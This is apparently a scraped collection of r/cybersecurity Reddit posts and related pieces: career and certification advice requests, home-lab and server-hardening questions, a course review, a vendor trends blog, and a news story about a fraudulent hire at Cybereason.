The general course topics include cryptographic standards used to protect data; best practices of logging and auditing, along with approaches to authentication and authorization; server and router security; forensics concepts and issues; the process, procedures, and technologies for collecting evidence; expectations of evidentiary reports; four basic types of attacks the IT security professional most likely to be encountered; introduction to passwords and password security; a summary of the Biba Integrity Model and the Bell-LaPadula Confidentiality Model; security issues associated with layered architecture model used in the design and study of TCP/IP; common attacks including Denial of Service and DNS tampering; defensive techniques and appliances available to the Information Security professional; wireless networks and the characteristics that can make them vulnerable to attack; operating system vulnerabilities; uses of encryption to include digital signatures and hardware encryption; common software traits, security requirements, vulnerability awareness, input validation, buffer overflows, common defensive programming techniques, and the basic principles of secure software development; secure design objectives and steps, coding standards, why it is important to ""think like an attacker,"" the importance of carefully choosing compilers and languages, risk based testing and DREAD modeling, as well as static and dynamic testing techniques; and Waterfall model, agile development, extreme programming (XP), and the Microsoft Security Development Lifecycle. The methods of evaluation include quizzes, examinations, and other online activities. To receive certification, the student must score 80% or higher on the comprehensive final examination. **ACE Credit recommendation:** In the lower-division baccalaureate/associate degree category, 2 semester hours in introduction to computer security ~~~~~~~~~~~~~~~ My background: BS CS, Ms Software Eng, 20+ yrs experience in Web Dev (virtually no network or security exp, other than web related vulnerabilities, web server security, etc.) Over the last few weeks, I completed each of the four courses of the program. Each course is broken in multiple modules from 4 to 8 depending on the course. Most modules took 60-90 minutes each. The topics were, as expected, very general and high level. It had been a really long time since I had to remember the OSI Model and the various layers, since college, and that level of knowledge is not something that I had ever used since, so that was a good refresher for me. The courses contained a pretty good overview of various networking and hardware topics along with some SDLC concepts. The digital forensics course felt like I was training to be a CSI - it was way more detailed than the network or software courses. I'm really weak in knowledge of networking, so some of this info was new to me. While the course content is decent, there's probably better free videos/courses on Udemy and other sites that addresses more specific content than the general topics covered here (however, I think this would be a good starting point since it does present a decent high level overview). Most of the content was created in 2012-2014, so some of the topics/names are dated a few years, but in general, it's not that bad. As far as applicability, if you're already in cybersecurity related field then this is kindergarten level stuff that you won't get any benefit from. However, if you're just work-adjacent to cybersecurity (web dev, app dev, help desk, etc.) then you might be able to learn a few things (or at least refresh your memory of college level info that you've forgotten). If you're thinking of career change or going for cybersecurity certification or degree, then this would be a good introduction (that's free). "

I have plenty of experience professionally building and maintaining multiple websites, but I've never handled the server management part of it professionally before. I've only ever made the site and maintained it on very beginner-friendly hosting services like BlueHost. I've been using Linux as my main OS since childhood, for about 10 years now, and have gotten very much into it (running stuff like a heavily customized XFCE, DIY distros like Arch, and many many homemade scripts to automate or add/fix functionality to various things). I have run Linux servers before, but only in a hobby setting. I've learned a bit about hacking growing up--I know my way around a packetdump--and I've always been interested in cybersecurity, but not quite enough to take an upper-div college elective on it, if that makes any sense. My OS class' teacher was a big cybersecurity guy, though (also the teacher of the main cybersecurity elective), and there was a lot he had to say about it that I listened to. So, given all that, what more should I go learn about or do (besides paying more attention to this subreddit, clearly) to have a good command of what I'm doing as a server admin? As you'd expect, there are already plenty of topics that I know of and already plan to look more into, but I'd like some help making sure I don't miss anything."

We continue to encourage honest, good faith, discourse. Heres some updates: * **Auto-Moderator:** The rules that were established last weekend are still in play, but theyre a bit more honed for their intended targets now. For instance, a *post* (self-post or link submission) now requires 90 days account history where as comments do not. On the flip side of that coin, *comments* require &gt;= 20 karma but have no account age requirements. This is still less than ideal, and will still catch well-meaning members to be targeted by the Auto-Moderator. What makes this different than last weeks mentality of collateral damage is that now there is a white-list mechanism in place. If anyone gets caught in the cross hair of Auto-Moderators remove button, message the mods and well review your account and your submission and add you to the whitelist. * **Subreddit Focus:** Weve heard you and all that remains on determining the focus of the new r/cybersecurity is our own internal deliberation. The r/cybersecurity mod team (u/chumstick, u/CDSEChris, u/Spncrgmn, and u/danielrm26) need to hash out our ideas, and our reservations, about the different directions the sub can be taken.

I was wondering if any of you run an OS with the security tools as a main OS? If so what OS and what have you done to set it up? My second question is, I am looking at making the setup secure. I have found some hardening guides etc but unsure what is the best way to proceed. I am currently running Manjaro but I am debating going with plain Arch and installing some security tools on there. From what I've understood, it is best to keep the pen\-testing in a contained environment in case anything goes wrong. Any help would be greatly appreciated! "

This has called for strict compliance rules within various domains. Starting from HIPAA to protect patient health information in the healthcare sector to Payment Card Industry Security Councils Data Security Standard(PCI DSS) in Retail. These standards and Regulatory measures are not merely about compliance but extremely important as regards companies cybersecurity program. All organizations must indulge in a continuous cybersecurity management program to protect themselves and their clients/ vendors from ransomware, malware and other Cyber security threats. Thus here's a wrap of Cyber security trends 2018. More than 50% of U.S. businesses experienced a cyber attack in 2017. If statistical trends are to be believed; companies of all sizes will continue to struggle with data breaches into 2018 too. In the face of such imminent cyber security threats, it becomes urgent for companies to adopt Cybersecurity solutions developed in-house or outsourced from cyber security experts. To this effect, some of the innovative cybersecurity trends that businesses can look forward to in 2018 are: Machine Learning: Machine learning (ML) is expected to come up in a big way for Cyber security solutions. Such solutions powered by ML capabilities will help predict and prevent cyber security instances in real time. It can help identify patterns of malicious activities whether on the endpoint, network, fraud or at the security management software, thus enabling easier detection of fraud. Customized Solutions: The growth in the number of unique businesses will lead to organizations exploring non-standard cyber security solutions including building or purchasing customized capabilities to meet compliance standards. Since the nature of every business is different, organizations will put more emphasis on solutions that are customized entirely to fit their purpose. As such Cyber security experts will be focussing more on customized solutions. Big Data Analytics: There will also be a lot of focus on Data processing and Analytics software capable of pulling threat intelligence feeds in addition to traditional log data. Such solutions will possess security analytics capabilities that process network behavior as well as user behavior to give more intelligence around whether an activity indicates malicious intent. These solutions will be capable of saving, sorting and processing huge amounts of data on a daily basis. Password Managers: Password management software will also see a surge in popularity this year. Such a software typically stores and manages the passwords that a user has for various online accounts and security features. The passwords are stored in an encrypted format and provide secure access to all the password information with the help of a master password. Encryption SaaS: Not only can Encryption help store passwords securely but it is also instrumental in securing online forms of communication. Such SaaS is especially important to meet standards such as the HIPAA compliance. It can ensure that communication of Patient health information(PHI) is done in a secure manner by encrypting the information. The data stays encrypted while it is being stored as well as transferred. This can prevent valuable information being supplied to miscreants. At Qwentic we understand the importance of Cyber security trends to your organization. Our best minds are continually employed in finding the most innovative, customized and secure solution for our clients which take advantage of Cyber security trends 2018.

IT is quickly evolving, with regards to the changing security landscapes; however new tools and methodologies bring new vulnerabilities. Hackers are getting more intelligent and updated in understanding the vulnerabilities in the system and for organisations, there is always a risk of losing valuable sensitive information. Nowadays the organizations are moving to cybersecurity background (identity, protect, detect, respond and Recovery). Security Incident &amp; Event Management (SIEM) is upgraded to support SOC operations to identify the real-time security incident &amp; log management and tracking the user suspicious behaviour activities from internal to external or external to internal traffic. SIEM focuses on actual problem solving, monitoring, correlation &amp; processing of security events and also combines two technologies Information security (IM) and event management(EM) which takes place in real time or near real time. These events work on alerts generation by the network device such as Switches, Routers, firewall, IDS, IPS and focus historical approach to log data information to support a detailed investigation Here are six key points to consider when applying a SIEM solution.  Avoid SIEM tools for a single application  Look for a solution with built-in security detection tools such as asset discovery, vulnerability assessment, network analysis, wireless intrusion detection, host-based intrusion detection, network-based intrusion detection, file integrity monitoring, log management.  Before evaluating solutions look for a cause to use cases  This will help better organise and prioritize data sources  Have an evaluation for worst-case scenarios to inform your incident response strategy  Include built-in threat intelligence that utilizes the latest in threat intelligence information  .Use IP reputation data to identify exposures inside and outside the network, to prioritize alarms and to monitor your business reputation  Automate deployment Detailed information here: URL"

I found some sites where you are allowed to legally hack them, and complete different challenges, and though some challenges were easy. I can see I'm missing knowledge/understanding of JavaScript, PHP and MySQL. Therefore I started learning JavaScript and when I'm finished I will move to PHP and so on. Am I doing the right thing here? Should I start with Kali tools beforehand or is this fine? To me, at least, it seems this way I learn about hacking, scripting, security, protection and vulnerabilities at entry level, but I have no idea since I am just a beginner. I have a friend who started with Kali tools, and practiced on some free pen testing lab and landed a job as a pen tester. But I would rather have deeper understanding of networks and servers before I move onto Kali, and that's why I'm starting with A+, although there is another reason, but that's not the question. "

I originally planned to graduate high school, join the Marines for 8 to 10 years, then become a police officer after leaving. I'm actually pretty smart (never got below a 3.75 GPA), so this plan didn't sit well with my parents. The USMC rejected me for a minor health issue (which is BS but whatever lol). So I went to college for a year, didn't like it, left and worked full time jobs for a few years. Now back in school. My dad saw that the community college just started a new cybersecurity program, and apparently he thought I'd be good at it because I play video games and whatnot, and I saw it pays well, so I decided to try it out. Fast forward to now, and I just don't get it lol. I got A's and B's my first semester, but that was basic stuff. I purposely tried to avoid any computer classes this semester, but ended up in a Linux/Unix class. I feel like I haven't made any progress, meanwhile all the people around me have incredible knowledge of typing code, running programs, etc, because they've been using computers daily their whole lives. I only use them for typing papers and whatnot. I got a D on my midterm even after studying for it all week. I feel like my professor is speaking Swahili half the time. Should I just accept that it's not for me? I just don't want to keep going to barely pass, and end up doing nothing with the degree. Also, other subjects (like criminal psychology) are just way more interesting to me.

But one threat slipped past the roughly $1 billion startups defenses: an executive hired to run Cybereasons human resources unit who the company says turned out to be a fraud. The incident was just the latest in what numerous current and former employees say has been a year of turmoil at the fast-growing company, including the turnover of nearly the entire sales department. In 2017, at least 60 employeesmore than a quarter of Cybereasons total at the start of the yearleft the company as a result of tensions with new leadership and cultural clashes between the companys offices in Boston and Tel Aviv, according to half a dozen current and former employees. Some of those employees left of their own accord and some were let go, CEO Lior Div confirmed in an interview with The Information. It was during this time that Cybereason, which was founded by Israeli intelligence veterans, hired a man who said his name was Kevin Brown for a senior human resources role, the company said. Cybereason had used an executive search agency in Boston to find qualified candidates for the job, the vice president of people operations, and interviewed multiple people before ultimately choosing Mr. Brown, the company said. Mr. Brown, whose real identity couldnt be confirmed, started at the company in June. Mr. Brown listed on his resume human resources positions at Google, IBM and other Boston-based firms, said a former Cybereason employee. But two people who worked at Cybereason with Mr. Brown said he struggled with basic human resources tasks. And despite claiming to have been drafted by the Chicago White Sox prior to college, he couldnt even swing a bat at a company recreational softball game, one said. After relocating to Boston from Dallas two weeks after his start date, the new hire also made repeated excuses as to why he couldnt show up regularly to the office, Mr. Div said. Thats when Mr. Div said Cybereason started working with a private investigator and tracing Mr. Browns activity on company systems. Mr. Brown was let go in August, around three months after he joined Cybereason. Duped At a company all-hands that month, Mr. Div said he told the staff that the company had been duped. Mr. Div said Mr. Brown had falsified his resume, references and manipulated background check questions. The deceit included an elaborate scheme in which emails to supposed references were redirected to Mr. Brown, who then responded, Mr. Div said. An internal investigation into the matter showed that it didnt appear that Mr. Brown had taken any sensitive customer or employee data. Based on that, Mr. Div said, the company concluded that the man wasnt trying to steal intellectual property or customer information. But the mishap alarmed some employees, who said a security company should have been able to easily spot a candidate who fabricated his background. This is a company run by Israeli intelligence officials, yet the most sensitive position you could hire for is one where they didn't have enough information about the person. ...That has resonance,"" said a former employee who was working at the company when Mr. Brown was there. Cybereason sells cybersecurity products to help businesses detect threats that could infiltrate their systems, like ransomware. It has secured more than $188 million in total funding. The most recent funding came last June, when SoftBank Corp, a subsidiary of SoftBank Group, invested $100 million. The investment was separate from SoftBanks high-profile Vision Fund. The round valued the company at nearly $1 billion, Mr. Div confirmed. SoftBank didnt respond to a request for comment. Cybereason specializes in endpoint security, which uses both analytics and sensors on devices to spot threats on corporate networks. Its rivals include industry veterans such as McAfee and Symantec, as well as newer entrants like Crowdstrike and Cylance. This is a company run by Israeli intelligence officials, yet the most sensitive position you could hire for is one where they didn't have enough information about the person. ...That has resonance. The market for cybersecurity technology has been booming amid a growing tally of major breaches of corporate networks. Worldwide spending on security is expected to reach more than $96 billion by the end of the year, up from $61.8 billion six years ago, according to research firm Gartner. Facing growing competitive pressure, Cybereason decided to make changes to its sales operation to boost growth ahead of an eventual IPO, Mr. Div said. He said he hoped to make the sales unit more data-driven, modeled after AppDynamics, an analytics company that grew quickly and ultimately was acquired by Cisco Systems for $3.7 billion. The changes included the hiring in early 2017 of Andrew Byron as chief revenue officer, an appointment that current and former employees said quickly caused turmoil. Multiple former employees said Mr. Byron would lash out against employees who disagreed with him, including threatening to fire them. You couldnt challenge him, a former employee who worked for Mr. Byron said. After that hiring, current and former employees described a shift in culture from a company that had previously prized transparency to one where it was lacking. The culture has done a 180, a current employee said. People loved the company. Now they hate it. The promise was that Cybereason early on [was] something that a lot of people bought into, and it was true and authentic, a former employee said. Its almost sad. ...We started off in the right direction and were very successful, but [with] the pressure to grow employees and revenue, it was never enough to just say we were a fast-growing company. We had to be the fastest-growing. New Sales Crew As employees started to leave, Mr. Byron brought in a crew of new salespeople from Mr. Byrons former company Fuze. Of the approximately 65 employees in sales at the time of Mr. Byrons hiring, oneat mostis still with the company, according to someone with direct knowledge of the situation. The company has increased hiring overall since the start of 2017 when the departures started in force, growing from around 200 employees to around 350 today. What we decided to do is make sure we have the right DNA in the company to enable us to scale, Mr. Div said. In this process we changed a lot of people. ...When you are doing this kind of massive change to accelerate growth there are some people that like it and some people that dont. Asked to comment about the characterizations made by former Cybereason employees, Mr. Byron said in a message sent via LinkedIn that he was hired to help Cybereason reach its next phase of growth, which he said required change and difficult decisions that may have disappointed some individuals. He denied having any contentious dealings with staff. Mr. Div described Mr. Byron as a very solid sales leader and denied any cultural problems with the executive. Cybereasons sales rose 140% in 2017 compared with the previous year. The first quarter of 2018 had exceeded its sales goals by 150%, Mr. Div said."

1764,cybersecurity,cybersecurity,I am currently studying CS and I am looking for advice.,7,7yjg77,https://www.reddit.com/r/cybersecurity/comments/7yjg77/i_am_currently_studying_cs_and_i_am_looking_for/,2018-02-19 13:33:43,"Greetings, Reddit. About a year ago I got out of the Military after eight years being a jet mechanic and started going to school for Cyber Security this past Fall. I haven't chosen a focus yet, but I am intrigued about Network Security. Lately I have been trying to teach myself some extremely basic stuff and I came to realize I need some further guidance because I don't even know where to start. So, I take a criminal justice course (My school pushes all Cyber majors to minor in CRJ for Forensics because its their creme de'le creme) and the class is pretty split. It is consisted of mostly juniors with some freshmen. I am among some of the freshmen and my professor is obviously aware, but it gave us an assignment to do that is geared toward juniors. The assignment is to seek out potential organizations, companies, firms, etc. and get information about internships - my professor does this so that the juniors can prepare to start looking for internships because it is required in order to graduate. My professor figures that it would be good for us freshmen in the class to look into this as well (I don't disagree). So by now you're probably asking ""WTF does this have to do with Cybersecurity"". Well, here is the kicker, I called this place that seemed appealing to intern at. I told the guy what I doing a project blah, blah, blah, and this guy started talking and he was feeding me JUST enough information that I should learn before interning, or at least, what should an intern already know before working for him. I asked him about certs, specifically Network+ and Security+ from CompTIA - he said they were basically trash. He told me ""I don't give a shit what school you graduate from, if its Harvard or MIT, but if you walk in here with a OSCP cert, I will hire you on the spot because then I will know you did your 'homework."" I know I want to be a penn tester because I believe, in my opinion, that this line of work is going to be beneficial in the future. but after talking to this guy and doing a little research on the OSCP test for the cert its obvious that this guy wasn't bullshitting. Now, I'm not saying I want to work for this company, but after looking at some things that he mentioned I am even more intrigued to learn, but I don't know where to even start. What are the crypto languages that I need to learn? What books should I consider reading? Should I focus on programming? Should I focus on coding? Whats the difference? Are the languages universal? I understand that people use Kali, but why? Why Kali and not Mac? or PC? I know people use PC to dual boot Kali, or just boot Kali straight up from USB - or some type of Linux variant. Are there terminal simulators that are available instead of just running a live Terminal and risk messing my computer up? How did you guys learn? I am only familiar with the very basic concept of- ""If you want a computer to do something, you need to know how to talk to it"" and Operation Systems have basically made ""talking"" to your computer a lost art. My school is a liberal arts university, but they're money maker is really criminal justice and financial fraud investigations, but it is also ranked 4 (or 6 idr) out of the ""Top 10 Schools"" in my state for cyber security, but I think thats because they push Forensics --hard, to go hand in hand with Criminal Justice and they do have a good programs for Cyber Forensics from what I can tell by talking to other students already working in the field. (which is funny to me because some of the students i've spoke to know how to extract data from a M.2 SSD, but don't know what a PCIe 1x slot is) So I have a little bit of doubt whether or not I will be able to learn what I need to learn to eventually become a white hat and I want to start learning this now, rather than later, so I have the experience I need to be successful. Currently, I read CompTIA's fifth edition of Security+ when I have some free time and I have Network+ on pre-order since the ninth edition is coming out sometime in June, or July. If there are some other book suggestions I can read and some other simulator resources out there I can practice messing around with the command line, that would be awesome if you could pass that info along.

It's nothing particularly actionable. No threats or anything. It's just some random person from my past saying awful things about me and trying to get into her head. They keep creating fake accounts, sending a message, then disabling the account, then sending another one. This has been going on sporadically for about two years now. We thought they had given up, but then she just got another one this week. Now, we have a great relationship. We've talked about these messages, and we're still pretty solid. But she is a divorcee from a relationship that involved cheating and trust issues, so it's a struggle for her. She trusts me, but as I'm sure you all know, when you get a ""what if"" stuck in your head and someone keeps poking at it, it's a tough thing to deal with. She hasn't replied at all to these messages, but they still keep coming sporadically. We haven't been able to figure out: a) who exactly it is (although I have some ideas) b) where they are coming from (which would likely narrow down who it could be) c) how we can prevent this Facebook, predictably, is of little help. It doesn't do any good to block these people, because they just create a new account, and Messenger apparently has no way to prevent you from getting unsolicited messages. She went off Messenger for a while, but she needs it for some family stuff and so on. And frankly, that's irritating. I hate that we have to change our behavior to avoid this crazy person. So that doesn't seem like it's solving the problem either. At the end of the day, I just wish she didn't have to worry about this at all. I want it to stop! And obviously, while I'm confident in our relationship, no one wants some crazy stranger chipping away at the basis of your love and trust. It's not fair for her to have to deal with this. Are you cybersecurity experts aware of anything we could do from a sleuthing perspective? Are there tools we could use to glean information like what IP the messages were sent from, so we at least would have a chance of narrowing down where they were sent from? Other subs I should consider asking? Anything like that? Any feedback would be welcome. Thanks."

The alleged presence of these hardware ""back doors"" remains highly classified. URL &gt;Before booting windows 7 or 8, the bios checks if C:\Windows\system32\autochk.exe is the Lenovo one or the original Microsoft one. If it is not the lenovo one, it moves it to C:\Windows\system32\0409\zz_sec\autobin.exe, and then writes it's own autochk.exe. During boot, the Lenovo autochk.exe writes a LenovoUpdate.exe and a LenovoCheck.exe file to the system32 directory, and sets up a services to run one of them when an internet connection is established. I don't know too much exactly what those do, but one appears to phone home to URL ... 2_oko.json which is a bit worrying with the combination of a ""ForceUpdate"" parameter shown and the lack of ssl, making it fairly likely that it's exploitable for remote code execution by anyone who can intercept your traffic(public wifi, etc).

I'm writing a book in which someone receives threatening phone messages sent from a pre-paid/burner phone. For the sake of realism, I'm wondering what info a cybersecurity company (or the police or a PI) could and could not glean from these calls. What are the steps they'd follow? The receiving phone would presumably have no information. I imagine the investigator would call the recipient's phone company and trace the call through the cell network? Would they be able to get the number it was sent from? If so, what info can you get from a phone number? Not the perpetrator, obviously, because they've thrown the phone away. Could they get the company that provided the number? The location (cell tower) the call originated at? (Even if it's in a different country? - Australia to USA in this case.) Would using the Burner app provide any additional info? (That is, is it ""less secure"" for the sender in that there's a way to trace the device the call came from?) For plot purposes, ideally I would like the investigator to be able to tell the victim that the call comes from a pre-paid phone in Australia (perhaps pinpointing it to a region) but not much else. Would the sender have to make a mistake for this info to be traceable? (That would be fine, as the sender isn't a pro.) Bonus q: At what level would the threatening messages rise to the level of a crime and what body would investigate it? This all takes place at the end of 2014 in case that matters, technology-wise."

I have an extremely broad skill set and I am always in a constant state of learning and practicing my tradecraft. In short, I do what I love and I love what I do. In the relatively near future, I am wanting to set up a small and inexpensive--*not cheap*--server stack. My thoughts, at least right now, are that I will want a firewall/IPS, IDS, centralized endpoint protection management, log file aggregation/data analytics, malware analysis toolkits (with a dedicated server to run them), and a proxy. I'm not opposed to dropping one or more, if needed. I have already lined up almost every freeware service or suite to accomplish this--all I need now is the hardware. I'd like for the servers (some will be discreet devices, others will be consolidated) to have as low of a power consumption as possible. If I can get a small form-factor, that is even better. I don't have a lot of available space in the house for a comm closet, so climate control/heat management could be a problem if they are large and use a lot of power. I won't be needing a super huge amount of RAM, processing power, or storage arrays and I don't have a problem with used or refurbished parts as long as they can still perform on par with the requirements. Before anyone mentions is--even though it is kind of obvious--VMs will be used to consolidate hardware resources (server hosts). So, if anyone reading this has a similar setup, has experience setting something like this up, or has recommendations or suggestions on what to consider purchasing, I am all ears. Thanks!"

Every department in the county is affected in some way, Phone systems, computer systems, everything. Some departments are handwriting documents. says Bingham County Commissioner Whitney Manwaring. The IT staff thought the infection had been cleaned up, but a redundant, backup server was infected again, leading to the county going offline. We had all kinds of firewalls in place to prevent these kinds of things from happening, Manwaring told EastIdahoNews.com. To prevent this from happening again there will likely be several more firewalls and more training for staff using county computers. More firewalls? Really? I'm not sure if this was misquoted by the press, or if the County Commish was just not familiar with the terms, but firewalls do very little to stop ransomware. Perhaps they are going to do a better job segmenting the network, and the staff training is a good idea though. &amp;nbsp; **Watch Dogs 2 New DLC Has a Ransomware Storyline** This may be the first time I've seen [ransomware in a video game](URL It's kind of telling as to how mainstream it's becoming. I can't speak for the game as I've never played it, but the premise of a ransomware fueled story mission is interesting. For those that do play, it's supposed to be available March 23rd. Let me know how it is. &amp;nbsp; **Office Inbox Receives 6.2X More Phishing And 4.3X More Malware Than Your Inbox At Home** While this doesn't mean you should let your guard down at home, it does mean that [attacks are focused](URL on organizations more than individuals. Interestingly enough, Companies active in real estate were the most targeted with malware, where organizations active in Finance, Entertainment and IT were the most targeted by phishing as of Q1 2017. &amp;nbsp; **Names, SSNs and W-2s of current and former employees of Lexington Medical Center lost in data breach** The names, SSNs, and W-2s of current and former employees at [Lexington Medical Center](URL are the latest victims of a data breach.

In this case, securing means preventing someone from accessing data on the drive as well as preventing a compromised drive from harming the system. These are really two separate problems, so I'll go into further details below. For all scenarios, assume you have full control of the systems writing and reading data to/from the storage drives, and they run some flavor of Linux. First, for preventing data theft: Imagine someone is able to remove a USB thumb drive from the system and plug it into their laptop. How would you prevent them from even seeing anything on the drive? Assume this is a regular off-the-shelf USB drive as far as hardware goes, but you have free reign as far as how the data was stored on the drive. A secondary objective is to prevent this user from adding any data to the drive. Either reading or writing to the drive is considered a failure unless the system is trusted. (Also, how do you define a ""trusted"" system?) Second, assuming the system itself is not compromised, how do you only allow the system to read data from a storage drive that is ""trusted""? Imagine a malicious user unplugs the trusted USB thumb drive from the system and plugs in their malicious USB thumb drive. How would you recognize the storage device as trusted?

So, I study IT, and I already started a degree on Cybersecurity, and one thing we talked in the begginig stages of such degree is ethics . We all know how to harm people, and how to do pretty mean stuff, but what stops us from doing that is ( at a super top level ) Ethics . We use the information to protect ( or develop new ways to protect ) people, not harm them . Having this said, I recently watched the new episode of Mr.Robot, wich is of course a fictional TV series, but I enjoy it because of the kinda true things that they show there, it's just not some guy randomly typing in its keyboard, in some stuff, there's some truth there. But this last episode, they showed clearly one specific tool ( SET - Social Engeneering Toolkit ), and that got me worried, cause it's not like they are showing some kid smoking weed ( the kid can only harm himself ), they are showing something that if learned and used for that purpose can do real harm . (Also, the concept is kinda that being a black-hat is cool ). So, please, I wanna know what you have to say about it . Is it ethical ? Is it a good idea to show it like that ? (And I know, for those of you that are going to say : Information is available do everyone ; I say that altough it's true, one thing is to have the information out there, another is to directly link a tool to a purpose . It's like a mind shortcut, those who watch and think it's cool and wanna do harm and stuff, don't have to look for days, weeks for it, they just showed a shortcut ) Then again, sorry for my english, and sorry for the kinda long read"

And I apologize for the long post in advance, but I really need your help, as my whole future depends on your help, and this important post. I am interested in Information Security, in fact, I have a strong passion in it, and that's why I chose IT Security over Medicine, Passion over Money/Prestigious. So I decided to make it my job field. I am enrolled in a Computer science program in a university, 1 month and 12 days left for it to start. I plan to have a master degree in CyberSecurity/IT Security if it's worth it. I have prior experience in hacking some machines, but nothing major, I was just a script kiddie unfortunately. And as I want to be a professional hacker/penetration tester, I am building the right strong skillset, including programming, networking, operation systems...before I start hacking any machine, or studying any security related degree/certification. I reached the part of my plan where I learn networking, my plan was like this: Network+ &gt; CCENT &gt; CCNA R&amp;S. I was planning to study them now, and take the exams in my last university year. The main reason I wanted to have those certification (or the CCNA R&amp;S) in my resume is to approve that I understand networking. So, I got the ""CompTIA Network+ All-In-One Exam Guide, Sixth Edition(Exam N10-006)"" Mike Meyer's book, and got shocked by how much information is need to be memorized in order to pass the exam, and understanding that information (which is the only needed in the real world field) isn't enough to. And, this is just the basic network+ cert., so the CCNA R&amp;S has much more to memorize (probably 1000+ pages). Also, all that memorization is not needed in the security/hacking field, I just need to understand TCP/IP, know how to pivot, understand wireshark, understand how firewalls work..I don't need to know how to configure 100+ switches with 30+ firewalls, and some load balancers, that is the networking man job. I understand that to hack a network protected using a firewall, and an IPS for example, i need to understand both of them in order to hack it, and that's what I am gonna do, I want to understand and memorize what's needed for hacking, but not 4000+ pages of networking at least. And i am gonna deploy that practically in labs. I am gonna configure switches, routers, firewalls, IPS &amp; IDS.., but I am not gonna memorize tons of things, just to pass a certification, that I am not gonna use, neither in the job, nor in my own hacking journey. Then, I kept thinking, is studying them using ""books maybe + cybrary + labs -packet tracer, virtual networks using vmware workstation-"" enough to fill this gap ? I checked indeed.com to see some job posts, and what they require, and no one required having those certifications, just a few required understanding TCP/IP. This same thing applies to Microsoft, and Red Hat, I planned to get some of their certifications, to approve that I understand Windows and Linux, but i think there is no need anymore. I can self-study them without getting a certification, for my knowledge base only, and focus on the security certifications, so I can now achieve the CEH (just to pass the HR), OSCP, maybe elearnsecurity (their courses are good, but their certifications are not well known unfortunately, so I don't know if it will help me getting a good job), and much more. And I thought, doesn't achieving OSCP approve that I understand the needed knowledge to do a penetration test ? Such as TCP/IP understanding, wireshark, linux, windows, scripting...as this knowledge is required to pass it! So, I can approve it to the employer this way. So now, I can achieve some important security certifications within my bachelor years, then I can join a master security degree if it's worth it (in USA or EUROPE) OR I will get a good security-related job immediately after graduation (I don't study in USA or Europe currently, but I would like to work there, as the people there appreciate Information Security much more than here), and then, I will start harvesting SANS certifications -i wish i can afford them on my own now-, and after some years, I will get the CISSP, and maybe then I can work as a CISO! Which is my goal, to be a CISO (As I know, it's the most paying and prestigious job in this field). In the same time, I will study security books as much as I can, I will build my own lab, I will use vulnerable machines such as the vulnhub's ones, i will use ctf365.com, I will stay up to date with security news and vulnerabilities, I will donate to penetration test local companies, i will attend CTFs, conferences, and bug bounty programs, I MAY make a blog, and I will do my best to fill up my resume (I will make a seperate post to gather as much as possible on what things can help my resume). You may ask, why did I post this if I already made my decision ? I didn't. I am still worried what is the right thing to do, that's why I need your help. I don't know what is better. I don't know if my path will work or not. I apologize for the long post. I hope you answer my following questions, and I appreciate any additional advice and suggestions. I hope you correct and direct me to the right path. My whole future depends on your help. 1. Can I get a security-related job immediately after graduation (I mean my first job is security-related one) with a CS BA degree, CEH cert., OSCP cert., and the self-study stuff that can be put on the resume (such as: books, online courses, achievements, donations, a blog, CTFs, conferences, bug bountry programs...) ? 2. Is my plan/path realistic ? 3. Can the CISO level be achieved this path ? (I think I need a management/Business certification to be a CISO) 4. Additional notes, advice, and suggestions are appreciated. Thanks in advance. -LonVenu | Reddit"

So, while this is considered, ""illegal"", I'd like to dig deeper from a Cybersecurity perspective as to just what she had, was it illegal and potentially what safeguards could have been in place. So if she was using a personal email server, she had a persistently running computer/domain controller running her email server, under her own domain, correct? That means she wasn't connecting via VPN to her official email (dod.gov, soc.mil, etc). Thus, those emailing her on that private domain would be just as guilty, correct? Using the DCID 6/3 or JFAN or DIACAP/RMF models, which controls is she violating, and what mitigating controls could be in place in order to make this connection compliant? Was she implementing DAR on her server? Was she connecting through a VPN using tunnel mode/IPSEC? Could she use PKI/Multi-factor authentication with different domains? Would using a IPS help? Could she have mandated classification markings on the emails prior to sending? Just wondering how we could validate/audit this particular situation if presented to us, and just how ""illegal"" this configuration was."

Cybersecurity interests me and it's definitely a hot field right now, but I'm at a bit of a loss as to how to get started. Should I go for dead-basic certs like Network+, Security+ or CCNA, or try to jump ahead to something like GSEC or ISC2? Would a formal programming class help?

I am currently studying International Business and Cybersecurity at my university and would like to practice outside of the classroom. So I came up with the idea of using a Raspberry Pi as my target for penetration testing. Basically I would have Kali installed on my host machine (Lenovo laptop) and Metasploitable on my Raspberry Pi. From the host machine I can initiate attacks against the target via a direct Ethernet cable connection. However, I have no idea how to even begin installing implementing this on the Raspberry Pi. Does anyone have any insight or can point me to any tutorials that might help me with this matter? I have used back trace and metasploitable on one machine before but I liked the idea of actually attacking a physically separate target. I have just started in the Cybersecurity field so if anyone with more experience has a better solution or if this idea will not work please feel free to comment as well. Thank you "

While On Cybersecurity Assessments,2,3o8cki,https://www.reddit.com/r/cybersecurity/comments/3o8cki/avoiding_ass_while_on_cybersecurity_assessments/,2015-10-11 03:18:01,"The term Stockholm Syndrome was coined after the 1973 robbery of Kreditbanken in Stockholm, Sweden, in which two robbers held four bank employees hostage from August 23 to 28. During this time, the victims shared a vault and became very familiar with their captorsin fact, they wound up emotionally attached and even defended them after the ordeal. The captives aligned themselves with the captors through empathy. Research states that during the psychological process of Stockholm Syndrome the feelings developed are not a result from a conscious decision or a rational choice to befriend a captor rather, a Freudian response to guard or distance themselves from and remain consciously unaware of unpleasant thoughts, feelings, and desiresand also helps individuals avoid hurt and disorganization. Being Assessed As organizations prepare for inspections; annual or no notice ((wink-wink, you always know when youre getting inspected  so get it together)) a level of anxiety builds among those responsible for securing the enterprise. Responsible teams begin to have weekly POA&amp;M meetings, SLA discussions, RACI charts negotiations, policy creation, and teleconferences concerning who was supposed to do what &amp; when was it supposed to be done with regards to issue resolution most often months overdue. Its too late. Avoiding A.S.S (Assessor Stockholm Syndrome) Those of us who have been tasked to assess, have for the most part been on the other side of the clipboard being assessed; answering questions which on some occasions felt like a set up. We understand the implication that jobs, bonuses, pay raises, and a day of comp time might be in jeopardy for those being assessed. However, your core role in assessments is to help organizations mature their levels of cybersecurity. It is not to align or bond with the captor err.. I mean team being assessed. I have assessed organizations and discovered violations of not only technical requirements but of best business practices in general. When discovered, the system operators/owners have pleaded to have one-on-one conversations to convey why they chose to circumvent proper security measure implementation. Reluctantly, I dont agree to meet, and explain their opportunity to convey or rebut findings upon assessment reporting completion. On other occasions mid-level management within assessed organizations have laid out their hand to showcase their violations, in an attempt to get the SMEs on the assessment team to help fix-on-the-fly and not document the discrepancies. In most cases plugging that hole leads to other discoveries  During an assessment aint nobody got time for that. There are other 